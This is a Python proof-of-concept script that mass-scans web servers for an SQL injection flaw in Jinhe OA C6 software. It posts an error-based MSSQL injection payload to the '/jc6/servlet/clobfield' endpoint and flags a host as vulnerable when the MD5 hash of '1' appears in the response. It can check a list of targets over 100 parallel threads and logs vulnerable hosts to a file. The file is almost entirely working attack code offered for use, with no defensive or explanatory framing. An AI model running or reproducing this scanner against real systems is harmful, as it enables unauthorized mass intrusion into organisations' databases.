import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """       ___       __  __           ____  ___        _____ ____    __ 
      / (_)___  / / / /__        / __ \/   |      / ___// __ \  / / 
 __  / / / __ \/ /_/ / _ \______/ / / / /| |______\__ \/ / / / / /  
/ /_/ / / / / / __  /  __/_____/ /_/ / ___ /_____/__/ / /_/ / / /___
\____/_/_/ /_/_/ /_/\___/      \____/_/  |_|    /____/\___\_\/_____/
                                                                    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='金和OA C6-GetSgIData.aspx SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/jc6/servlet/clobfield'
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Content-Length':'158',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br, zstd',
        'Content-Type':'application/x-www-form-urlencoded',
        'SL-CE-SUID':'77',
    }
    data = "key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','1'))))--+"
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if '40f5888b67c748df7efba008e7c2f9d2' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()